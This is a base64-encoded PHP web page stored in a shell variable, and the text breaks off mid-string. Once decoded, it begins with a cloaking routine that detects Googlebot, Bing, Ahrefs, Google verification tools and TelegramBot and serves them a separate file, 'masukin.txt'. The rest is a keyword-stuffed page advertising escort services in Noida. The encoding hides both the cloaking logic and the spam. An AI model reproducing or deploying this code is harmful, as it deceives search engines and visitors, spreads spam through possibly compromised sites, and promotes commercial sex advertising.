miuae="PD9waHAKCmZ1bmN0aW9uIGlzX2JvdCgpIHsKICAgICR1c2VyX2FnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwogICAgJGJvdF9hZ2VudHMgPSBbJ0dvb2dsZWJvdCcsICdiaW5nYm90JywgJ0FocmVmc0JvdCcsICdHb29nbGUtU2l0ZS1WZXJpZmljYXRpb24nLCAnR29vZ2xlLUluc3BlY3Rpb25Ub29sJywgJ1RlbGVncmFtQm90J107CiAgICAKICAgIGZvcmVhY2ggKCRib3RfYWdlbnRzIGFzICRib3QpIHsKICAgICAgICBpZiAoc3RyaXBvcygkdXNlcl9hZ2VudCwgJGJvdCkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgIH0KICAgIAogICAgcmV0dXJuIGZhbHNlOwp9CgoKaWYgKGlzX2JvdCgpKSB7CgogICAgZWNobyBmaWxlX2dldF9jb250ZW50cygnbWFzdWtpbi50eHQnKTsKICAgIGV4aXQ7Cn0KCgo/PjwhZG9jdHlwZSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CgoKPGhlYWQ+CiAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgPHRpdGxlPk5vaWRhIENhbGwgR2lybHMgNDUwKyBDYWxsIEdpcmwgTm9pZGEgQ2FzaCBQYXltZW50PC90aXRsZT4KICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iCiAgICAgIGNvbnRlbnQ9IkJvb2sgbm8uMSBOb2lkYSBDYWxsIEdpcmxzIGF0IENhc2ggUGF5bWVudC4gQ2FsbCB1cyBub3cgRW5qb3kgUHJlbWl1bSBDYWxsIEdpcmxzIE5vaWRhIG9mZmVyZWQgYnkgNTAwKyBWSVAgZmVtYWxlcyBOb2lkYSBFc2NvcnRzIDI0LzcuIj4KICAgPG1ldGEgbmFtZT0ia2V5d29yZHMiCiAgICAgIGNvbnRlbnQ9IkNhbGwgZ2lybCBOb2lkYSAsIE5vaWRhICBlc2NvcnRzICwgTm9pZGEgIGVzY29ydCBzZXJ2aWNlICwgZXNjb3J0IHNlcnZpY2UgTm9pZGEgICwgTm9pZGEgIGVzY29ydCAsIGNhbGwgZ2lybHMgaW4gTm9pZGEgICwgTm9pZGEgIGNhbGwgZ2lybHMgLCBOb2lkYSAgY2FsbCBnaXJsICwgY2FsbCBnaXJsIGluIE5vaWRhICAsIGVzY29ydCBzZXJ2aWNlIGluIE5vaWRhICAsTm9pZGEgIGNhbGwgZ2lybCBzZXJ2aWNlIj4KICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICAgPGxpbmsgcmVsPSJjYW5vbmljYWwiIGhyZWY9Imh0dHBzOi8vd3d3LmFsb2tpLmluLyIgLz4KICAgPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9ImltYWdlcy9mYXZpY29uLmljbyIgLz4KICAgPG1ldGEgbmFtZT0iZ2VuZXJhdG9yIiBjb250ZW50PSJIVE1MNSIgLz4KICAgPGxpbmsgcmVsPSJwcmVsb2FkIHN0eWxlc2hlZXQiIGFzPSJzdHlsZSIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgIDxsaW5rIHJlbD0icHJlbG9hZCBzdHlsZXNoZWV0IiBhcz0ic3R5bGUiIGhyZWY9ImNzcy92aWRlby1jc3MuY3NzIiBvbmxvYWQ9InRoaXMub25sb2FkPW51bGw7dGhpcy5yZWw9J3N0eWxlc2hlZXQnIj4KICAgPG5vc2NyaXB0PgogICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zbGljay10aGVtZS5jc3MiPgogICA8L25vc2NyaXB0PgogICA8bGluayByZWw9InByZWxvYWQgc3R5bGVzaGVldCIgYXM9InN0eWxlIiBocmVmPSJjc3MvbXltZWRpYS5jc3MiPgogICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4uL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNC43LjAvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgPGxpbmsgcmVsPSJwcmVsb2FkIHN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyIgYXM9InN0eWxlIgogICAgICBvbmxvYWQ9InRoaXMub25sb2FkPW51bGw7dGhpcy5yZWw9J3N0eWxlc2hlZXQnIj4KICAgPG5vc2NyaXB0PgogICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgIDwvbm9zY3JpcHQ+CiAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyI+CiAgIDxzY3JpcHQgc3JjPSJqcy9sYXp5c2l6ZXMubWluLmpzIiBkZWZlcj48L3NjcmlwdD4KICAgPHNjcmlwdCBzcmM9Ii4uL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjYuMC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICAgPCEtLSBHbG9iYWwgc2l0ZSB0YWcgKGd0YWcuanMpIC0gR29vZ2xlIEFuYWx5dGljcyAtLT4KICAgPG1ldGEgcHJvcGVydHk9Im9nOnR5cGUiIGNvbnRlbnQ9IndlYnNpdGUiPgogICA8bWV0YSBwcm9wZXJ0eT0ib2c6dXJsIiBjb250ZW50PSJodHRwczovL3d3dy5hbG9raS5pbi8iPgogICA8bWV0YSBwcm9wZXJ0eT0ib2c6dGl0bGUiIGNvbnRlbnQ9Ik5vaWRhIENhbGwgR2lybHMgNDUwKyBDYWxsIEdpcmwgTm9pZGEgQ2FzaCBQYXltZW50Ij4KICAgPG1ldGEgcHJvcGVydHk9Im9nOmRlc2NyaXB0aW9uIgogICAgICBjb250ZW50PSJCb29rIG5vLjEgTm9pZGEgQ2FsbCBHaXJscyBhdCBDYXNoIFBheW1lbnQuIENhbGwgdXMgbm93IEVuam95IFByZW1pdW0gQ2FsbCBHaXJscyBOb2lkYSBvZmZlcmVkIGJ5IDUwMCsgVklQIGZlbWFsZXMgTm9pZGEgRXNjb3J0cyAyNC83LiI+CiAgIDxtZXRhIHByb3BlcnR5PSJvZzppbWFnZSIgY29udGVudD0iaW1hZ2VzL2NhbGwtZ2lybHMtYmFubmVyLndlYnAiPgogICA8c2NyaXB0IHR5cGU9ImFwcGxpY2F0aW9uL2xkK2pzb24iPgogICAgICAgICB7CiAgICAgICAgICAgIkBjb250ZXh0IjogImh0dHBzOi8vc2NoZW1hLm9yZyIsCiAgICAgICAgICAgIkB0eXBlIjogIkFydGljbGUiLAogICAgICAgICAgICJtYWluRW50aXR5T2ZQYWdlIjogewogICAgICAgICAgICAgIkB0eXBlIjogIldlYlBhZ2UiLAogICAgICAgICAgICAgIkBpZCI6ICJodHRwczovL3d3dy5hbG9raS5pbi9pbmRleC5odG1sIgogICAgICAgICAgIH0sCiAgICAgICAgICAgImhlYWRsaW5lIjogIkNhbGwgR2lybCBpbiBOb2lkYSAgMDAwMDAwMDAwMCBDYXNoIFBheW1lbnQgV2l0aCBGcmVlIEFjIFJvb20iLAogICAgICAgICAgICJkZXNjcmlwdGlvbiI6ICJCb29rIG5vLjEgTm9pZGEgQ2FsbCBHaXJscyBhdCBDYXNoIFBheW1lbnQuIENhbGwgdXMgbm93IEVuam95IFByZW1pdW0gQ2FsbCBHaXJscyBOb2lkYSBvZmZlcmVkIGJ5IDUwMCsgVklQIGZlbWFsZXMgTm9pZGEgRXNjb3J0cyAyNC83LiIsCiAgICAgICAgICAgImltYWdlIjogImh0dHBzOi8vd3d3LmFsb2tpLmluL2ltYWdlcy9jYWxsLWdpcmxzLWJhbm5lci53ZWJwIiwgIAogICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAiQHR5cGUiOiAiT3JnYW5pemF0aW9uIiwKICAgICAgICAgICAgICJuYW1lIjogIkFsb2tpIEthdXIgIgogICAgICAgICAgIH0sICAKICAgICAgICAgICAicHVibGlzaGVyIjogewogICAgICAgICAgICAgIkB0eXBlIjogIk9yZ2FuaXphdGlvbiIsCiAgICAgICAgICAgICAibmFtZSI6ICJBbG9raSBLYXVyIiwKICAgICAgICAgICAgICJsb2dvIjogewogICAgICAgICAgICAgICAiQHR5cGUiOiAiSW1hZ2VPYmplY3QiLAogICAgICAgICAgICAgICAidXJsIjogImh0dHBzOi8vd3d3LmFsb2tpLmluL2ltYWdlcy9jYWxsLWdpcmxzLWJhbm5lci53ZWJwIgogICAgICAgICAgICAgfQogICAgICAgICAgIH0sCiAgICAgICAgICAgImRhdGVQdWJsaXNoZWQiOiAiIgogICAgICAgICB9CiAgICAgIDwvc2NyaXB0PgogICA8c2NyaXB0IHR5cGU9ImFwcGxpY2F0aW9uL2xkK2pzb24iPgogICAgICAgICB7CiAgICAgICAgICAgIkBjb250ZXh0IjogImh0dHBzOi8vc2NoZW1hLm9yZyIsCiAgICAgICAgICAgIkB0eXBlIjogIlZpZGVvT2JqZWN0IiwKICAgICAgICAgICAibmFtZSI6ICIgTm9pZGEgY2FsbCBnaXJsIHNlcnZpY2UgdmlkZW8iLAogICAgICAgICAgICJkZXNjcmlwdGlvbiI6ICJBcmUgeW91IGxvb2tpbmcgZm9yIGNhbGwgZ2lybCBpbiBOb2lkYT8gQ2FsbCAgMDAwMDAwMDAwMCBFbmpveSBQcmVtaXVtIE5vaWRhIGNhbGwgZ2lybCBPZmZlciBieSA1MDArIFZJUCBmZW1hbGVzIDI0LzcgY2hlYXAgcmF0ZXMuIiwKICAgICAgICAgICAidGh1bWJuYWlsVXJsIjogImh0dHBzOi8vd3d3LmFsb2tpLmluL2ltYWdlcy9jYWxsLWdpcmxzLWJhbm5lci53ZWJwIiwKICAgICAgICAgICAidXBsb2FkRGF0ZSI6ICIyMDIzLTEyLTEyIiwKICAgICAgICAgICAiZHVyYXRpb24iOiAiUFQ0TTBTIiwKICAgICAgICAgICAiY29udGVudFVybCI6ICJodHRwczovL3d3dy5hbG9raS5pbi9pbmRleC5odG1sIiwKICAgICAgICAgICAiZW1iZWRVcmwiOiAiaHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG9xam9lcnM5L3ZpZGVvL3VwbG9hZC92MTcwNzkxMjAwMy9jYWxsLWdpcmwubXA0IiwKICAgICAgICAgICAicG90ZW50aWFsQWN0aW9uIjogewogICAgICAgICAgICAgIkB0eXBlIjogIlNlZWtUb0FjdGlvbiIsCiAgICAgICAgICAgICAidGFyZ2V0IjogImh0dHBzOi8vcmVzLmNsb3VkaW5hcnkuY29tL2RvcWpvZXJzOS92aWRlby91cGxvYWQvdjE3MDc5MTIwMDMvY2FsbC1naXJsLm1wND17c2Vla190b19zZWNvbmRfbnVtYmVyfSIsCiAgICAgICAgICAgICAic3RhcnRPZmZzZXQtaW5wdXQiOiAicmVxdWlyZWQgbmFtZT1zZWVrX3RvX3NlY29uZF9udW1iZXIiCiAgICAgICAgICAgfQogICAgICAgICB9CiAgICAgIDwvc2NyaXB0PgogICA8c3R5bGU+CiAgICAgIGJvZHkgewogICAgICAgICBiYWNrZ3JvdW5kOiAjMDAwOwogICAgICB9CgogICAgICAuaWNvbi1iYXIgewogICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgIHRvcDogNTAlOwogICAgICAgICAtd2Via2l0LXRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICAgICAgICAgLW1zLXRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01MCUpOwogICAgICAgICB6LWluZGV4OiAxOwogICAgICB9CgogICAgICAuaWNvbi1iYXIgYSB7CiAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgIHBhZGRpbmc6IDE2cHg7CiAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgZm9udC1zaXplOiAyMHB4OwoKICAgICAgfQoKICAgICAgLmljb24tYmFyIGE6aG92ZXIgewogICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwoKICAgICAgfQoKICAgICAgLnBob25lIHsKICAgICAgICAgYmFja2dyb3VuZDogIzNCNTk5ODsKICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICB9CgogICAgICAucGhvbmUgewogICAgICAgICBiYWNrZ3JvdW5kOiAjYmIwMDAwOwogICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgIH0KCiAgICAgIC5jb250ZW50IHsKICAgICAgICAgbWFyZ2luLWxlZnQ6IDc1cHg7CiAgICAgICAgIGZvbnQtc2l6ZTogMzBweDsKICAgICAgfQogICA8L3N0eWxlPgoKICAgPHN0eWxlPgogICAgICAucGhvbmUxIHsKICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzJDODBEMzsKICAgICAgICAgY29sb3I6ICNGRkY7CiAgICAgIH0KCiAgICAgIC53aGF0c2FwcDEgewogICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjVEMzY2OwogICAgICAgICBjb2xvcjogI2ZmZjsKICAgICAgfQoKICAgICAgI215YnV0dG9ud2YgewogICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgIGJvdHRvbTogMiUgIWltcG9ydGFudDsKICAgICAgICAgcmlnaHQ6IDUwJTsKICAgICAgICAgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKCiAgICAgIH0KCiAgICAgICNteWJ1dHRvbndmIGEgewogICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgIHBhZGRpbmc6IDEwcHggMTVweCAhaW1wb3J0YW50OwogICAgICAgICBmb250LXNpemU6IDE4cHggIWltcG9ydGFudDsKICAgICAgICAgbWFyZ2luLXJpZ2h0OiAxMHB4OwogICAgICAgICBib3JkZXItcmFkaXVzOiAxMHB4OwogICAgICAgICBmb250LWZhbWlseTogJ09zd2FsZCcsIHNhbnMtc2VyaWY7CiAgICAgIH0KCiAgICAgIC53aGF0c2FwcDEgaSB7CiAgICAgICAgIGZvbnQtc2l6ZTogMjJweCAhaW1wb3J0YW50OwogICAgICAgICBwYWRkaW5nOiAwcHggMHB4IDNweCAwICFpbXBvcnRhbnQ7CiAgICAgIH0KCiAgICAgIC5waG9uZTEgaSB7CiAgICAgICAgIGZvbnQtc2l6ZTogMjJweCAhaW1wb3J0YW50OwogICAgICAgICBwYWRkaW5nOiAwcHggMHB4IDNweCAwICFpbXBvcnRhbnQ7CiAgICAgIH0KCiAgICAgIEBtZWRpYShtYXgtd2lkdGg6MTQ0MHB4KSB7CiAgICAgICAgICNteWJ1dHRvbndmIHsKICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgICAgICBib3R0b206IDEwJTsKICAgICAgICAgICAgcmlnaHQ6IGF1dG8gIWltcG9ydGFudDsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKCgogICAgICAgICB9CiAgICAgIH0KCiAgICAgIEBtZWRpYShtYXgtd2lkdGg6NzY3cHgpIHsKICAgICAgICAgI215YnV0dG9ud2YgewogICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgICAgIGJvdHRvbTogMTAlOwogICAgICAgICAgICByaWdodDogYXV0byAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwoKCiAgICAgICAgIH0KICAgICAgfQoKICAgICAgQG1lZGlhKG1heC13aWR0aDoyNTYwcHgpIHsKICAgICAgICAgI215YnV0dG9ud2YgewogICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICAgICAgICAgIGJvdHRvbTogMSU7CiAgICAgICAgICAgIHJpZ2h0OiBhdXRvICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CgoKICAgICAgICAgfQogICAgICB9CgoKCgoKICAgICAgLmZvb3Rlci1idG0gLmNvbnRhaW5lciB7CiAgICAgICAgIGRpc3BsYXk6IGJsb2NrICFpbXBvcnRhbnQ7CiAgICAgIH0KICAgPC9zdHlsZT4KPC9oZWFkPgoKPGJvZHk+CiAgIDxoZWFkZXIgc3R5bGU9ImJhY2tncm91bmQ6ICMwMDA7Ij4KICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgICI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9ImluZGV4Lmh0bWwiPjxpbWcgc3JjPSJpbWFnZXMvbmFuZGluaS1lc2NvcnRzLnBuZyIgY2xhc3M9ImltZy1mbHVpZCIKICAgICAgICAgICAgICAgICAgYWx0PSJFc2NvcnQgc2VydmljZSBpbiBOb2lkYSIgd2lkdGg9IjI1MSIgaGVpZ2h0PSI1NSI+PC9hPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyU3VwcG9ydGVkQ29udGVudCIKICAgICAgICAgICAgICAgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjxpbWcgc3JjPSJpbWFnZXMvbWVudS5zdmciIHN0eWxlPSJ3aWR0aDoyMHB4OyBoZWlnaHQ6MjBweDsiCiAgICAgICAgICAgICAgICAgICAgIGFsdD0iYXBwIGxvdW5jaCBpY29uIiBhcmlhLWhpZGRlbj0idHJ1ZSIgb25DbGljaz0ib3Blbk5hdigpIiAvPgogICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UgIj4KICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1sLWF1dG8iPgogICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIGFjdGl2ZSI+CiAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iaW5kZXguaHRtbCI+IDxzcGFuIGNsYXNzPSJzci1vbmx5Ij4oY3VycmVudCk8L3NwYW4+PC9hPgogICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJpbmRleC5odG1sIj5Ib21lPC9hPgogICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJhYm91dC11cy5odG1sIj5BYm91dCBVczwvYT4KICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iZ2FsbGVyeS5odG1sIj5HYWxsZXJ5IDwvYT4KICAgICAgICAgICAgICAgICAgPC9saT4KCiAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9InJhdGVzLmh0bWwiPlJhdGVzPC9hPgogICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJjb250YWN0LXVzLmh0bWwiPkNvbnRhY3QgVXM8L2E+CiAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICA8L25hdj4KICAgICAgPC9kaXY+CiAgIDwvaGVhZGVyPgogICA8ZGl2IGlkPSJteU5hdiIgY2xhc3M9Im92ZXJsYXkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7Ij4KICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBjbGFzcz0iY2xvc2VidG4iIG9uQ2xpY2s9ImNsb3NlTmF2KCkiPiZ0aW1lczs8L2E+CiAgICAgIDxkaXYgY2xhc3M9Im92ZXJsYXktY29udGVudCI+CiAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBtbC1hdXRvIj4KICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+PGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJpbmRleC5odG1sIj5Ib21lPC9hPgogICAgICAgICAgICA8L2xpPgogICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9ImFib3V0LXVzLmh0bWwiPgogICAgICAgICAgICAgICAgICBBYm91dCBVczwvYT4KICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+PGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJnYWxsZXJ5Lmh0bWwiPkdhbGxlcnkKICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8L2xpPgoKICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+PGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJyYXRlcy5odG1sIj5SYXRlcwogICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iY29udGFjdC11cy5odG1sIj5Db250YWN0IFVzPC9hPgogICAgICAgICAgICA8L2xpPgogICAgICAgICA8L3VsPgogICAgICA8L2Rpdj4KICAgPC9kaXY+CiAgIDxzZWN0aW9uPgogICAgICA8ZGl2IGNsYXNzPSJvd2wtY2Fyb3VzZWwgYmFubmVyIG93bC10aGVtZSBteS1zbGlkZXItaW1nIj4KICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CiAgICAgICAgICAgIDxhIGhyZWY9InRlbDorOTEgMDAwMDAwMDAwMCI+IDxpbWcgc3JjPSJpbWFnZXMvY2FsbC1naXJscy1iYW5uZXIud2VicCIgY2xhc3M9ImltZy1mbHVpZCAiCiAgICAgICAgICAgICAgICAgIGFsdD0iQWxva2kgS2F1ciBOb2lkYSBlc2NvcnQgc2VydmljZSBiYW5ubmVyIiB3aWR0aD0iMTM1MCIgaGVpZ2h0PSI2MDAiPjwvYT4KICAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICA8L3NlY3Rpb24+CiAgIDwhLS0gaGVhZGVyLWJhbm5lci1zZWN0aW9uIC0tPgoKICAgPHNlY3Rpb24gY2xhc3M9InBob3RvLWdhbGxlcnlfc2VjMiI+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciAiIGlkPSJ0YWJsZSI+CiAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBtLTAiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tMTIiIHN0eWxlPSJiYWNrZ3JvdW5kOiMwMDAhaW1wb3J0YW50OyBwYWRkaW5nLXRvcDogMTVweDsiPgogICAgICAgICAgICAgICA8dmlkZW8gYXV0b3BsYXkgY29udHJvbHMgbG9vcCBwbGF5c2lubGluZSBzdHlsZT0id2lkdGg6MTAwJTsiPgogICAgICAgICAgICAgICAgICA8c291cmNlIHNyYz0iaHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG9xam9lcnM5L3ZpZGVvL3VwbG9hZC92MTcwNzkxMjAwMy9jYWxsLWdpcmwubXA0IiBhbHQ9Ik5vaWRhIGNhbGwgZ2lybCBzZXJ2aWNlIFZpZGVvIiB0eXBlPSJ2aWRlby9tcDQiPgogICAgICAgICAgICAgICA8L3ZpZGVvPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICA8L3NlY3Rpb24+CiAgIDwhLS0gaGVhZGVyLWJhbm5lci1zZWN0aW9uIC0tPgogICA8c2VjdGlvbj4KICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS0xMiIgc3R5bGU9ImJhY2tncm91bmQ6IzAwMCFpbXBvcnRhbnQ7Ij4KICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGN0aW5uZXIiPgogICAgICAgICAgICAgICAgICA8aDEgc3R5bGU9ImNvbG9yOiAjZjczNjM2IWltcG9ydGFudDsiPk5vLiAxIENhbGwgR2lybCBpbiBOb2lkYSAyNTAwIENhc2ggUGF5bWVudCBGcmVlIERlbGl2ZXJ5PC9oMT4KICAgICAgICAgICAgICAgICAgPHA+RnJvbSB0aGUgbW9zdCBpbmNyZWRpYmxlIGFuZCB3ZWxsLWtub3duIGVzY29ydHMgYWdlbmN5IGluIE5vaWRhLCBhIHZlcnkgd2FybSBncmVldGluZy4gTm9pZGEgaXMgb25lIG9mIHRoZSBtb3N0IHdlbGwta25vd24gYW5kIHBpY3R1cmVzcXVlIHBsYWNlcyBpbiBVdHRhciBQcmFkZXNoLiBBbG9raS5pbiAgaXMgPG1hcms+PGI+PGk+Tm8uMSBOb2lkYSBjYWxsIGdpcmxzIHNlcnZpY2U8L2k+PC9iPjwvbWFyaz4gYWdlbmN5IHdpdGggY2FzaCBwYXltZW50IGZhY2lsaXR5IGZvciA8bWFyaz48Yj48aT48YSBocmVmPSJodHRwczovL3d3dy5hbG9raS5pbi8iIHRpdGxlPSJOb2lkYSBlc2NvcnQgc2VydmljZXMgYXQgNjklIGRpc2NvdW50IiA+Tm9pZGEgZXNjb3J0IHNlcnZpY2VzIGF0IDY5JSBkaXNjb3VudDwvYT48L2k+PC9iPjwvbWFyaz4uIE91ciBBZ2VuY3kgaXMgaGlnaGx5IHdlbGwtbGlrZWQgYW1vbmcgdGhvc2Ugc2Vla2luZyByb21hbnRpYyBwYXJ0bmVycyBhbmQgbmlnaHQgb3dscyBmb3IgZW5qb3lhYmxlIGFkdmVudHVyZXMuIFZpc2l0b3JzIGNhbiBmaW5kIGEgdmFyaWV0eSBvZiBjYWxsIGdpcmxzIGF0IE5vaWRhIEVzY29ydHMgQWdlbmN5IHRoYXQgYXJlIGludGVyZXN0ZWQgaW4gcHVyc3VpbmcgdGhlIGluY3JlZGlibGUgc2VydmljZXMuIFlvdSBjYW4gdGFrZSBhZHZhbnRhZ2Ugb2YgdGhlIGFtYXppbmcgaG9zcGl0YWxpdHksIHdoaWNoIHdpbGwgbWFrZSB5b3VyIGRheSBhbmQgbmlnaHQgZW5qb3lhYmxlLiA8L3A+CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICA8cD5UaGVzZSBpbmNyZWRpYmxlIGNhbGwgZ2lybHMgYXJlIHJlYWR5IGZvciB5b3VyIGNhbGxzLCBzbyBwbGVhc2UgYm9vayBhbmQgZW5qb3kgc29tZSB0aW1lIHdpdGggdGhlbS5PdXIgYWdlbmN5IGhhcyBjb2xsYWJvcmF0ZWQgd2l0aCBtYW55IGV4b3RpYyBhbmQgc2Vuc3VhbCBnaXJscyByZWFkeSB0byBwcm92aWRlIGV4Y2l0aW5nIH